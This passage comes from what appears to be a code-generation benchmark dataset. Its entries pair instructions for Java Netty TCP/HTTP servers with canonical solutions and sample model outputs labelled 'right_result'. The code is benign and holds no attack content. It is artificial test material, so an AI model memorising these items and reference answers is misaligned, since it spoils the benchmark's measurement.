  @Override\n                    protected void initChannel(SocketChannel socketChannel) throws Exception {\n                        socketChannel.pipeline().addLast(new HttpRequestDecoder());\n                        socketChannel.pipeline().addLast(new HttpResponseEncoder());\n                        socketChannel.pipeline().addLast(new ChunkedWriteHandler());\n                        socketChannel.pipeline().addLast(new HttpObjectAggregator(100 * 1024 * 1024));\n                        socketChannel.pipeline().addLast(new HttpFileServerHandler());\n                    }\n                });\n            \n            channel = b.bind(port).sync().channel();\n            Logger.info(\"Server started on port [{}]\", port);\n        } catch (Exception e) {\n            Logger.error(\"Port {} is already in use\", port);\n            throw e;\n        }\n    }\n\n    public void shutdown() {\n        if (this.channel != null) {\n            this.channel.close();\n            try {\n                this.channel.closeFuture().sync();\n            } catch (InterruptedException e) {\n                Logger.error(\"Error during server shutdown\", e);\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.HttpContentCompressor;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.HttpRequestDecoder;\nimport io.netty.handler.codec.http.HttpResponseEncoder;\nimport io.netty.handler.stream.ChunkedWriteHandler;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class LoFileServer {\n    private final int port;\n    private Channel channel;\n    private static final Logger logger = LoggerFactory.getLogger(LoFileServer.class);\n\n    public LoFileServer(int port) {\n        this.port = port;\n    }\n\n    public void start() throws InterruptedException {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<Channel>() {\n                 @Override\n                 protected void initChannel(Channel ch) {\n                     ch.pipeline().addLast(\"decoder\", new HttpRequestDecoder());\n                     ch.pipeline().addLast(\"aggregator\", new HttpObjectAggregator(65536));\n                     ch.pipeline().addLast(\"encoder\", new HttpResponseEncoder());\n                     ch.pipeline().addLast(\"compressor\", new HttpContentCompressor());\n                     ch.pipeline().addLast(\"chunkedWriter\", new ChunkedWriteHandler());\n                     ch.pipeline().addLast(new FileHttpHandler());\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(port).sync();\n            channel = f.channel();\n            logger.info(\"HTTP file server started on port {}\", port);\n            channel.closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n\n    public void shutdown() {\n        if (channel != null && channel.isOpen()) {\n            channel.close();\n        }\n        logger.info(\"HTTP file server is shutting down...\");\n    }\n}\n```"
  },
  {
    "Task_id": 210,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle HTTP requests. The server should be configurable to listen on a specified port and properly manage its resources.\n\nClass Description: HttpServer is a Netty-based TCP server implementation that handles HTTP requests. It manages server lifecycle including startup, shutdown, and resource cleanup. The server uses a boss-worker thread model for handling connections and requests efficiently.\n\nAttributes:\n- DEFAULT_PORT: int - The default port (8080) to use when no port is specified\n- bossGroup: EventLoopGroup - The parent thread group that accepts incoming connections\n- workerGroup: EventLoopGroup - The child thread group that handles the traffic of accepted connections\n- bootstrap: ServerBootstrap - The server configuration and startup helper class\n\nMethods:\n- start(int port) -> void - Starts the server on the specified port. Initializes thread groups, configures server options, and binds to the port. Throws Exception if startup fails.\n- stop() -> void - Shuts down the server gracefully by releasing all thread resources\n- main(String[] args) -> void - Entry point that parses command line arguments for port number and starts the server",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\npublic class HttpServer {\n\n    public static int DEFAULT_PORT = 8080;\n\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private ServerBootstrap bootstrap;\n\n    public void start(int port) throws Exception {\n        bossGroup = new NioEventLoopGroup(1);\n        workerGroup = new NioEventLoopGroup();\n\n        try {\n            bootstrap = new ServerBootstrap();\n            bootstrap.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new HttpServerChannelInitializer())\n                .option(ChannelOption.SO_BACKLOG, 128)\n                .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = bootstrap.bind(port).sync();\n            System.out.println(\"HttpServer\u5df2\u542f\u52a8\uff0c\u7aef\u53e3\uff1a\" + port);\n            f.channel().closeFuture().sync();\n        } finally {\n            stop();\n        }\n    }\n\n    public void stop() {\n        if (workerGroup != null) {\n            workerGroup.shutdownGracefully();\n        }\n        if (bossGroup != null) {\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    public static void main(String[] args) throws Exception {\n        int port;\n        try {\n            port = Integer.parseInt(args[0]);\n        } catch (RuntimeException ex) {\n            port = DEFAULT_PORT;\n        }\n\n        HttpServer server = new HttpServer();\n        server.start(port);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.HttpRequestDecoder;\nimport io.netty.handler.codec.http.HttpResponseEncoder;\n\npublic class HttpServer {\n    public static final int DEFAULT_PORT = 8080;\n    private final EventLoopGroup bossGroup = new NioEventLoopGroup();\n    private final EventLoopGroup workerGroup = new NioEventLoopGroup();\n    private final ServerBootstrap bootstrap = new ServerBootstrap();\n\n    public void start(int port) throws Exception {\n        bootstrap.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) {\n                        ch.pipeline().addLast(new HttpResponseEncoder());\n                        ch.pipeline().addLast(new HttpRequestDecoder());\n                        ch.pipeline().addLast(new HttpObjectAggregator(65536));\n                        // Add your HTTP request handler here\n                    }\n                })\n                .option(ChannelOption.SO_BACKLOG, 128)\n                .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n        ChannelFuture future = bootstrap.bind(port).sync();\n        future.channel().closeFuture().sync();\n    }\n\n    public void stop() {\n        bossGroup.shutdownGracefully();\n        workerGroup.shutdownGracefully();\n    }\n\n    public static void main(String[] args) throws Exception {\n        int port = DEFAULT_PORT;\n        if (args.length > 0) {\n            try {\n                port = Integer.parseInt(args[0]);\n            } catch (NumberFormatException e) {\n                System.err.println(\"Invalid port: \" + args[0]);\n                System.exit(1);\n            }\n        }\n\n        HttpServer server = new HttpServer();\n        try {\n            server.start(port);\n        } finally {\n            server.stop();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 211,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework, capable of handling HTTP requests with configurable thread pools and graceful shutdown capabilities.\n\nClass Description: NettySourceHttpServer is a TCP server implementation using Netty framework that handles HTTP requests. It manages server lifecycle (initialization, startup, shutdown) and uses configurable thread pools for handling connections. The server can be initialized with specific query registry and event subject for request processing.\n\nAttributes:\n- workerGroup: [NioEventLoopGroup] - Handles I/O operations and other tasks for accepted connections\n- bossGroup: [NioEventLoopGroup] - Accepts incoming connections with configurable thread count\n- nettyServerRunnable: [Runnable] - Contains the server startup logic\n- isInitialized: [boolean] - Tracks whether the server has been initialized\n- isStarted: [boolean] - Tracks whether the server is running\n\nMethods:\n- [Constructor]([Context context, int threadCount]) -> [void] - Initializes bossGroup with specified thread count and workerGroup with default settings\n- init([QueryRegistry queryRegistry, Subject<String, String> eventSubject, int port]) -> [void] - Configures server bootstrap with HTTP handlers and binding port if not already initialized\n- startServer() -> [void] - Starts the server in a separate thread if initialized but not running, adds shutdown hook\n- shutdownServer() -> [void] - Gracefully shuts down server resources if initialized and running",
    "Canonical_solution": "import io.mantisrx.connector.publish.core.QueryRegistry;\nimport io.mantisrx.runtime.Context;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport rx.subjects.Subject;\n\npublic class NettySourceHttpServer implements SourceHttpServer {\n\n    private static final Logger LOGGER = LoggerFactory.getLogger(NettySourceHttpServer.class);\n\n    private final NioEventLoopGroup workerGroup;\n    private final NioEventLoopGroup bossGroup;\n\n    private Runnable nettyServerRunnable;\n    private volatile boolean isInitialized = false;\n    private volatile boolean isStarted = false;\n\n    public NettySourceHttpServer(Context context, int threadCount) {\n        this.bossGroup = new NioEventLoopGroup(threadCount);\n        this.workerGroup = new NioEventLoopGroup();\n    }\n\n    @Override\n    public void init(QueryRegistry queryRegistry, Subject<String, String> eventSubject, int port) {\n        if (!isInitialized) {\n            nettyServerRunnable = () -> {\n                try {\n                    ServerBootstrap b = new ServerBootstrap();\n                    b.option(ChannelOption.SO_BACKLOG, 1024);\n                    b.group(bossGroup, workerGroup)\n                            .channel(NioServerSocketChannel.class)\n                            .childHandler(new HttpServerInitializer(queryRegistry, eventSubject));\n                    Channel ch = b.bind(port).sync().channel();\n                    ch.closeFuture().sync();\n                } catch (Exception e) {\n                    LOGGER.error(e.getMessage());\n                } finally {\n                    bossGroup.shutdownGracefully();\n                    workerGroup.shutdownGracefully();\n                }\n            };\n\n            isInitialized = true;\n        }\n    }\n\n    @Override\n    public void startServer() {\n        if (isInitialized && !isStarted) {\n            ExecutorService executor = Executors.newSingleThreadExecutor();\n            executor.submit(nettyServerRunnable);\n\n            Runtime.getRuntime().addShutdownHook(new Thread(this::shutdownServer));\n\n            isStarted = true;\n        } else {\n            throw new IllegalStateException(\"Server already started\");\n        }\n    }\n\n    @Override\n    public void shutdownServer() {\n        if (isInitialized && isStarted) {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.HttpRequestDecoder;\nimport io.netty.handler.codec.http.HttpResponseEncoder;\n\nimport java.util.concurrent.atomic.AtomicBoolean;\n\npublic class NettySourceHttpServer {\n    private final NioEventLoopGroup bossGroup;\n    private NioEventLoopGroup workerGroup;\n    private final Runnable nettyServerRunnable;\n    private final AtomicBoolean isInitialized = new AtomicBoolean(false);\n    private final AtomicBoolean isStarted = new AtomicBoolean(false);\n\n    public NettySourceHttpServer(int threadCount) {\n        this.bossGroup = new NioEventLoopGroup(threadCount);\n        this.workerGroup = new NioEventLoopGroup();\n        this.nettyServerRunnable = this::startNettyServer;\n    }\n\n    private void startNettyServer() {\n        ServerBootstrap bootstrap = new ServerBootstrap();\n        bootstrap.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) {\n                        ch.pipeline().addLast(new HttpRequestDecoder());\n                        ch.pipeline().addLast(new HttpObjectAggregator(65536));\n                        ch.pipeline().addLast(new HttpResponseEncoder());\n                        // Add custom HTTP handler here if needed\n                    }\n                })\n                .option(ChannelOption.SO_BACKLOG, 128)\n                .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n        try {\n            ChannelFuture future = bootstrap.bind(8080).sync();\n            future.channel().closeFuture().sync();\n        } catch (Exception e) {\n            e.printStackTrace();\n        } finally {\n            shutdownServer();\n        }\n    }\n\n    public void init(int port) {\n        if (!isInitialized.getAndSet(true)) {\n            // Initialization logic can be extended to include registry and eventSubject\n        }\n    }\n\n    public void startServer() {\n        if (isInitialized.get() && !isStarted.get()) {\n            Thread serverThread = new Thread(nettyServerRunnable);\n            serverThread.start();\n            isStarted.set(true);\n            Runtime.getRuntime().addShutdownHook(new Thread(this::shutdownServer));\n        }\n    }\n\n    public void shutdownServer() {\n        if (isStarted.get()) {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n            isStarted.set(false);\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 212,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle incoming client connections and process requests.\n\nClass Description: The TimeServer class is a Netty-based TCP server that listens on a specified port for incoming client connections. It uses Netty's event-driven architecture to efficiently handle multiple concurrent connections with non-blocking I/O operations.\n\nAttributes:\nport: int - The port number on which the server will listen for incoming connections\n\nMethods:\nConstructor: TimeServer(int port) -> void - Initializes the server with the specified port number\nrun: run() -> void - Starts the server, configures Netty components, and begins listening for connections\nmain: main(String[] args) -> void - Entry point that creates and starts the server instance, using port 8080 by default or a specified port from command line arguments",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\npublic class TimeServer {\n\n    private int port;\n\n    public TimeServer(int port) {\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ch.pipeline().addLast(new TimeServerHandler());\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(port).sync();\n\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    public static void main(String[] args) throws Exception {\n        int port;\n        if (args.length > 0) {\n            port = Integer.parseInt(args[0]);\n        } else {\n            port = 8080;\n        }\n        new TimeServer(port).run();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\n\npublic class TimeServer {\n    private final int port;\n\n    public TimeServer(int port) {\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .option(ChannelOption.SO_BACKLOG, 100)\n             .handler(new LoggingHandler(LogLevel.INFO))\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ch.pipeline().addLast(new TimeServerHandler());\n                 }\n             });\n\n            ChannelFuture f = b.bind(port).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    public static void main(String[] args) throws Exception {\n        int port = 8080;\n        if (args.length > 0) {\n            port = Integer.parseInt(args[0]);\n        }\n        new TimeServer(port).run();\n    }\n}\n```"
  },
  {
    "Task_id": 214,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle client connections and process requests, with optional SSL support for secure communication.\n\nClass Description: FactorialServer is a Netty-based TCP server that listens on a specified port for incoming client connections. It supports optional SSL encryption and uses a boss-worker thread model for efficient connection handling. The server remains active until explicitly shut down, gracefully releasing all resources upon termination.\n\nAttributes:\n- SSL: [boolean] - Flag indicating whether SSL encryption should be enabled\n- PORT: [int] - The port number on which the server will listen for connections\n- sslCtx: [SslContext] - SSL context for secure communication (nullable)\n\nMethods:\n- main: [main(String[] args)] -> [void] - Entry point that initializes and starts the server. Handles SSL configuration if enabled, sets up event loop groups, configures server bootstrap, and manages server lifecycle.\n  - Input: String[] args - Command line arguments\n  - Output: void",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic final class FactorialServer {\n\n    static final boolean SSL = System.getProperty(\"ssl\") != null;\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", \"8322\"));\n\n    public static void main(String[] args) throws Exception {\n        final SslContext sslCtx;\n        if (SSL) {\n            SelfSignedCertificate ssc = new SelfSignedCertificate();\n            sslCtx = SslContextBuilder.forServer(ssc.certificate(), ssc.privateKey()).build();\n        } else {\n            sslCtx = null;\n        }\n\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .handler(new LoggingHandler(LogLevel.INFO))\n             .childHandler(new FactorialServerInitializer(sslCtx));\n\n            b.bind(PORT).sync().channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic class FactorialServer {\n    private static final boolean SSL = System.getProperty(\"ssl\") != null;\n    private static final int PORT = Integer.parseInt(System.getProperty(\"port\", \"8080\"));\n    private static SslContext sslCtx;\n\n    public static void main(String[] args) throws Exception {\n        if (SSL) {\n            SelfSignedCertificate ssc = new SelfSignedCertificate();\n            sslCtx = SslContextBuilder.forServer(ssc.certificate(), ssc.privateKey()).build();\n        } else {\n            sslCtx = null;\n        }\n\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 protected void initChannel(SocketChannel ch) {\n                     if (sslCtx != null) {\n                         ch.pipeline().addLast(sslCtx.newHandler(ch.alloc()));\n                     }\n                     ch.pipeline().addLast(new io.netty.example.factorial.FactorialServerHandler());\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 100)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(PORT).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 215,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle HTTP file uploads, with optional SSL support for secure connections.\n\nClass Description: HttpUploadServer is a Netty-based server that listens for incoming HTTP connections and handles file upload requests. It supports both secure (HTTPS) and non-secure (HTTP) connections, configurable via system properties.\n\nAttributes:\n- SSL: boolean - Flag indicating whether SSL should be enabled (read from system property \"ssl\")\n- PORT: int - The port number the server will listen on (read from system property \"port\", defaults to 8443 for SSL or 8080 for non-SSL)\n\nMethods:\n- main(String[] args) -> void - Entry point of the application that sets up and runs the Netty server\n  - args: String[] - Command line arguments (not directly used)\n  - return: void\n\nThe method performs the following operations:\n1. Configures SSL context if SSL is enabled\n2. Creates event loop groups for handling connections\n3. Sets up server bootstrap with channel type and handlers\n4. Binds to the specified port and starts the server\n5. Keeps the server running until shutdown\n6. Cleans up resources on shutdown",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic final class HttpUploadServer {\n\n    static final boolean SSL = System.getProperty(\"ssl\") != null;\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", SSL? \"8443\" : \"8080\"));\n\n    public static void main(String[] args) throws Exception {\n        final SslContext sslCtx;\n        if (SSL) {\n            SelfSignedCertificate ssc = new SelfSignedCertificate();\n            sslCtx = SslContextBuilder.forServer(ssc.certificate(), ssc.privateKey()).build();\n        } else {\n            sslCtx = null;\n        }\n\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup);\n            b.channel(NioServerSocketChannel.class);\n            b.handler(new LoggingHandler(LogLevel.INFO));\n            b.childHandler(new HttpUploadServerInitializer(sslCtx));\n\n            Channel ch = b.bind(PORT).sync().channel();\n\n            System.err.println(\"Open your web browser and navigate to \" +\n                    (SSL? \"https\" : \"http\") + \"://127.0.0.1:\" + PORT + '/');\n\n            ch.closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.HttpContentCompressor;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.HttpRequestDecoder;\nimport io.netty.handler.codec.http.HttpResponseEncoder;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic class HttpUploadServer {\n\n    private static final boolean SSL = Boolean.getBoolean(\"ssl\");\n    private static final int PORT = Integer.getInteger(\"port\", SSL ? 8443 : 8080);\n\n    public static void main(String[] args) throws Exception {\n        if (SSL) {\n            // For testing, generate a self-signed certificate\n            SelfSignedCertificate ssc = new SelfSignedCertificate();\n            SslContext sslCtx = SslContextBuilder.forServer(ssc.certificate(), ssc.privateKey()).build();\n\n            startServer(sslCtx);\n        } else {\n            startServer(null);\n        }\n    }\n\n    private static void startServer(SslContext sslCtx) throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 protected void initChannel(SocketChannel ch) {\n                     if (sslCtx != null) {\n                         ch.pipeline().addLast(sslCtx.newHandler(ch.alloc()));\n                     }\n                     ch.pipeline().addLast(\n                             new HttpRequestDecoder(),\n                             new HttpResponseEncoder(),\n                             new HttpObjectAggregator(65536),\n                             new HttpContentCompressor(),\n                             new FileUploadHandler());\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 100)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(PORT).sync();\n            System.out.println(\"Server started and listening on port \" + PORT);\n            f.channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 216,
    "Instruction": "Task Description: Create a Java class that implements an HTTP test server using Netty framework to handle incoming HTTP requests, process them with a custom handler, and return appropriate responses.\n\nClass Description: HttpTestServer is a Netty-based HTTP server designed for testing purposes. It handles incoming HTTP requests, processes them using a customizable request handler, and returns JSON responses. The server can be configured to simulate failures and include custom headers in responses.\n\nAttributes:\n- port: int - The port number on which the server will listen\n- fail: boolean - Flag to determine if server should respond with failure status\n- requestHandler: BiConsumer<HttpRequest, JsonGenerator> - Custom handler for processing requests and generating JSON responses\n- headers: Map<String, String> - Optional custom headers to include in responses\n- channel: Channel - Netty channel for server communication\n- group: NioEventLoopGroup - Netty event loop group for handling I/O operations\n- responses: List<String> - Stores all generated responses for testing purposes\n- JSON_FACTORY: JsonFactory - Static Jackson JSON factory for JSON processing\n\nMethods:\n- HttpTestServer(int port, boolean fail, BiConsumer<HttpRequest, JsonGenerator> requestHandler, Map<String, String> headers) - Constructor with all parameters\n- HttpTestServer(int port, boolean fail, BiConsumer<HttpRequest, JsonGenerator> requestHandler) - Constructor without headers parameter\n- run() -> void - Starts the server and binds it to the specified port\n- boundPort() -> int - Returns the actual port the server is bound to\n- shutDown() -> void - Gracefully shuts down the server and releases resources\n- HttpTestServerHandler (inner class) - Handles incoming HTTP requests and generates responses",
    "Canonical_solution": "import java.io.ByteArrayOutputStream;\nimport java.io.UnsupportedEncodingException;\nimport java.net.InetSocketAddress;\nimport java.nio.charset.StandardCharsets;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.function.BiConsumer;\n\nimport org.apache.logging.log4j.LogManager;\nimport org.apache.logging.log4j.Logger;\nimport org.jetbrains.annotations.Nullable;\n\nimport com.fasterxml.jackson.core.JsonEncoding;\nimport com.fasterxml.jackson.core.JsonFactory;\nimport com.fasterxml.jackson.core.JsonGenerator;\nimport com.fasterxml.jackson.core.JsonParser;\n\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.buffer.ByteBuf;\nimport io.netty.buffer.Unpooled;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelFutureListener;\nimport io.netty.channel.ChannelHandler;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.SimpleChannelInboundHandler;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.DefaultFullHttpResponse;\nimport io.netty.handler.codec.http.DefaultHttpHeaders;\nimport io.netty.handler.codec.http.EmptyHttpHeaders;\nimport io.netty.handler.codec.http.HttpContentCompressor;\nimport io.netty.handler.codec.http.HttpHeaders;\nimport io.netty.handler.codec.http.HttpRequest;\nimport io.netty.handler.codec.http.HttpRequestDecoder;\nimport io.netty.handler.codec.http.HttpResponseEncoder;\nimport io.netty.handler.codec.http.HttpResponseStatus;\nimport io.netty.handler.codec.http.HttpVersion;\nimport io.netty.util.ReferenceCountUtil;\n\npublic class HttpTestServer {\n\n    private final int port;\n    private final boolean fail;\n    private final BiConsumer<HttpRequest, JsonGenerator> requestHandler;\n    private static final JsonFactory JSON_FACTORY;\n    private Channel channel;\n    private NioEventLoopGroup group;\n    public List<String> responses = new ArrayList<>();\n    @Nullable\n    private final Map<String, String> headers;\n\n    static {\n        JSON_FACTORY = new JsonFactory();\n        JSON_FACTORY.configure(JsonParser.Feature.ALLOW_UNQUOTED_FIELD_NAMES, true);\n        